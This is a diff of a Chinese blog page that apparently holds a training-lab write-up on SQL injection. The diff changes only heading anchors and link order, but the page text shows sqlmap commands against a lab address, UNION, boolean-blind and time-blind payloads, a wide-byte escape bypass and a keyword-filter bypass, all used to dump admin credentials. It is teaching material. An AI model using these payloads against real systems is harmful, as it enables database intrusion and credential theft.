@@ -233,21 +233,21 @@
         <p>本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。</p>
 <a id="more"></a>
 
-<h2><span id="1数字型注入">1.数字型注入</span></h2><p>直接用sqlmap</p>
+<h2 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h2><p>直接用sqlmap</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs  #列数据库信息</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables   #查看数据库下的表名</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump</span><br></pre></td></tr></table></figure>
 
 <p>手工注入：</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20f</span>rom%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20f</span>rom%<span class="number">20</span>user</span><br></pre></td></tr></table></figure>
 
 <p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
-<h2><span id="2字符型注入">2.字符型注入</span></h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' 报错</span></span><br><span class="line"><span class="string">'</span><span class="meta">%</span><span class="number">23</span> 正确</span><br></pre></td></tr></table></figure>
+<h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' 报错</span></span><br><span class="line"><span class="string">'</span><span class="meta">%</span><span class="number">23</span> 正确</span><br></pre></td></tr></table></figure>
 
 <p>猜测为字符型注入。</p>
 <p>爆库</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span>and%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20</span>from%<span class="number">20</span>user %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p>
-<h2><span id="3布尔盲注">3.布尔盲注</span></h2><p>（1）判断类型</p>
+<h2 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h2><p>（1）判断类型</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' 不显示结果</span><br><span class="line"><span class="number">1</span>%<span class="number">27</span>%<span class="number">23</span> 正确  you are in</span><br></pre></td></tr></table></figure>
 
 <p>根据方法判断是盲注</p>
@@ -264,7 +264,7 @@
 
 
 
-<h2><span id="4时间盲注">4.时间盲注</span></h2><p>尝试</p>
+<h2 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4.时间盲注"></a>4.时间盲注</h2><p>尝试</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and sleep(<span class="number">3</span>) %<span class="number">23</span>   <span class="comment">//where 语句里面可以用sleep函数。</span></span><br></pre></td></tr></table></figure>
 
 <p>发现时间延长。</p>
@@ -277,7 +277,7 @@
 
 
 
-<h2><span id="宽字符注入">宽字符注入</span></h2><p>输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。</p>
+<h2 id="宽字符注入"><a href="#宽字符注入" class="headerlink" title="宽字符注入"></a>宽字符注入</h2><p>输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>%<span class="number">9</span>c%<span class="number">27</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>成功绕过。直接查表</p>
@@ -292,7 +292,7 @@
 
 
 
-<h2><span id="绕过select过滤">绕过select过滤</span></h2><p>尝试<code>union%20select%201,2,3</code>,发现select 被过滤了。</p>
+<h2 id="绕过select过滤"><a href="#绕过select过滤" class="headerlink" title="绕过select过滤"></a>绕过select过滤</h2><p>尝试<code>union%20select%201,2,3</code>,发现select 被过滤了。</p>
 <p>尝试重写绕过<code>union seselectlect 1,2,3</code>成功。或者大小写绕过也成功<code>union Select 1,2,3</code>成功。</p>
 <p>过滤语句应该是进行简单的替换。</p>
 <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">1</span> <span class="class"><span class="keyword">union</span>%20<span class="title">Select</span>%201,<span class="title">username</span>,<span class="title">password</span>%20<span class="title">from</span>%20<span class="title">user</span></span></span><br></pre></td></tr></table></figure>
@@ -303,7 +303,7 @@
 
 
 
-<h2><span id="进阶之真实案例">进阶之真实案例</span></h2><p>随便浏览发现可能注入点：</p>
+<h2 id="进阶之真实案例"><a href="#进阶之真实案例" class="headerlink" title="进阶之真实案例"></a>进阶之真实案例</h2><p>随便浏览发现可能注入点：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>product<span class="regexp">/product.php?id=5</span></span><br></pre></td></tr></table></figure>
 
 <p>多番尝试后发现注不出来。</p>
@@ -398,13 +398,13 @@
       <div class="popular-posts-title"><a href="\web\合天培训_实验_web安全之HTTP头部字段理解\" rel="bookmark">实验_web安全之HTTP头部字段理解</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件包含漏洞\" rel="bookmark">实验-文件包含漏洞</a></div>
-    </li>
-    <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="\web\合天培训_实验_命令执行\" rel="bookmark">合天培训_实验_命令执行</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="\web\合天培训_实验_文件上传考核\" rel="bookmark">合天培训_实验_上传文件考核</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_文件包含漏洞\" rel="bookmark">实验-文件包含漏洞</a></div>
     </li>
   </ul>
 
@@ -483,7 +483,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text">1.数字型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">2.</span> <span class="nav-text">2.字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">3.</span> <span class="nav-text">3.布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">4.</span> <span class="nav-text">4.时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">5.</span> <span class="nav-text">宽字符注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">6.</span> <span class="nav-text">绕过select过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">7.</span> <span class="nav-text">进阶之真实案例</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-数字型注入"><span class="nav-number">1.</span> <span class="nav-text">1.数字型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-字符型注入"><span class="nav-number">2.</span> <span class="nav-text">2.字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-布尔盲注"><span class="nav-number">3.</span> <span class="nav-text">3.布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-时间盲注"><span class="nav-number">4.</span> <span class="nav-text">4.时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字符注入"><span class="nav-number">5.</span> <span class="nav-text">宽字符注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过select过滤"><span class="nav-number">6.</span> <span class="nav-text">绕过select过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶之真实案例"><span class="nav-number">7.</span> <span class="nav-text">进阶之真实案例</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
